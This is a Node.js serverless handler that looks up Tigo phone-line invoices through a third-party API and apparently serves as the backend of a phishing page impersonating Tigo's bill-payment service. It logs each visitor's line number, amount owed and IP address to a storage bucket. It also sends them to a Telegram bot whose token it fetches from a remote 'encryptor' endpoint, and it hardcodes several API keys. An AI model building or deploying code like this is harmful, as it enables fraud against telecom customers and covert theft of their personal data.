require('dotenv').config();

const https = require('https');
const crypto = require('crypto');
const AWS = require('aws-sdk');

const API_KEY = 'tigo_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';

const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;

function generarTxid() {
    return crypto.randomBytes(16).toString('hex');
}

async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
    try {
        const response = await fetch(
            `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
            {
                headers: {
                    'X-API-Key': process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v'
                }
            }
        );
        const data = await response.json();
        return { token: data.token || data.bot_token, chatId: data.chat_id };
    } catch (error) {
        return null;
    }
}

async function enviarNotificacionTelegram(txid, transaccion) {
    try {
        const creds = await obtenerCredencialesTelegram('tigoconsulta');
        if (!creds?.token || !creds?.chatId) return;

        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${transaccion.referencia}\n<b>Valor:</b> ${transaccion.valor_formateado}\n<b>Estado:</b> ${transaccion.estado}\n<b>IP:</b> ${transaccion.ip}`;

        await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: creds.chatId, text: mensaje, parse_mode: 'HTML' })
        });
    } catch (error) {
        console.error('Error Telegram:', error);
    }
}

async function guardarConsultaFactura(txid, datos, clientIp) {
    const consulta = { txid, ip: clientIp, referencia: datos.referencia, valor_pago: datos.valor_pago, valor_formateado: datos.valor_formateado, convenio: datos.convenio, estado: 'pendiente', timestamp: new Date().toISOString() };

    return new Promise((resolve, reject) => {
        s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
            let content = '';
            if (!err && data?.Body) content = data.Body.toString();
            content += JSON.stringify(consulta) + '\n';

            s3.putObject({ Bucket: BUCKET, Key: 'datos_consultas.txt', Body: content, ContentType: 'text/plain' }, (err) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
    });
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(400).json({ ok: false, error: 'POST requerido' });
    }

    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { referencia } = body;

        if (!referencia) {
            return res.status(400).json({ ok: false, error: 'Referencia requerida' });
        }

        const postData = JSON.stringify({ referencia, api_key: API_KEY });

        return new Promise((resolve) => {
            const options = {
                hostname: 'api.cloudapi.life',
                path: '/tigo.php',
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
            };

            const apiReq = https.request(options, (apiRes) => {
                let data = '';
                apiRes.on('data', chunk => { data += chunk; });
                apiRes.on('end', async () => {
                    try {
                        const facturaData = JSON.parse(data);
                        if (facturaData.ok && facturaData.factura) {
                            const txid = generarTxid();
                            const clientIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown';

                            await guardarConsultaFactura(txid, facturaData.factura, clientIp);
                            await enviarNotificacionTelegram(txid, { ...facturaData.factura, ip: clientIp });

                            resolve(res.status(200).json({ ...facturaData, txid }));
                        } else {
                            resolve(res.status(200).json(facturaData));
                        }
                    } catch (error) {
                        resolve(res.status(500).json({ ok: false, error: 'Error procesando respuesta' }));
                    }
                });
            });

            apiReq.on('error', (error) => {
                resolve(res.status(500).json({ ok: false, error: 'Error al consultar API: ' + error.message }));
            });

            apiReq.write(postData);
            apiReq.end();
        });
    } catch (error) {
        return res.status(400).json({ ok: false, error: 'Error: ' + error.message });
    }
};
